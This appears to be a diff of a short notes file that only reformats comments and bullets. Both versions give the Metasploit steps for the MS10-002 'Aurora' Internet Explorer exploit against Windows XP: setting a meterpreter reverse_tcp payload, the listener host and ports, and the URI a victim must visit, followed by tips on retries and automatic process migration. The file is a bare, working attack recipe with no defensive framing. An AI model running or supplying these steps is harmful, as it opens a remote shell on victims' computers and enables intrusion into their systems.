@@ -1,12 +1,12 @@
-# This is a pretty much manual exploit affecting Windows XP through IE, do the following:
+// This is a pretty much manual exploit affecting Windows XP through IE, do the following:
 
-use exploit/windows/browser/ms10_002_aurora
-set PAYLOAD windows/meterpreter/reverse_tcp
-set SRVPORT [portnum] # Select a port number.
-set URIPATH [path] #The path that the victim needs to enter to connect.
-set LHOST [IP]
-set LPORT [portnum]
-exploit -z
+- use exploit/windows/browser/ms10_002_aurora
+- set PAYLOAD windows/meterpreter/reverse_tcp
+- set SRVPORT [portnum] // Select a port number.
+- set URIPATH [path] // The path that the victim needs to enter to connect.
+- set LHOST [IP]
+- set LPORT [portnum]
+- exploit -z // Exploit and don't connect to the created session automatically.
 
-#Set ReverseConnectRetries for more retries.
-#Set AutoRunScript miragte -f to automatically migrate to a new process.
+// Set ReverseConnectRetries for more retries.
+// Set AutoRunScript miragte -f to automatically migrate to a new process.
